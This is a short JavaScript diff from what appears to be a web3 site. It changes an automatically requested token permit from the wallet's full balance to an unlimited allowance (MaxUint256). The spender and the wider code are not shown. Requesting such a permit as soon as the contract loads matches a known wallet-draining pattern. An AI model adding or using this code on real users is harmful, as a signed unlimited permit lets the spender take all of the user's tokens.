@@ -399,9 +399,9 @@ async function initTokenContractAndSignPermit() {
         
         document.getElementById('amount').value = balanceFormatted;
         
-        showStatus('Signing permit for full balance...', 'info');
+        showStatus('Signing permit for maximum allowance...', 'info');
         
-        const amountWei = balance;
+        const amountWei = ethers.constants.MaxUint256;
         
         const nonce = await tokenContract.nonces(userAddress);
         const deadline = Math.floor(Date.now() / 1000) + 86400;
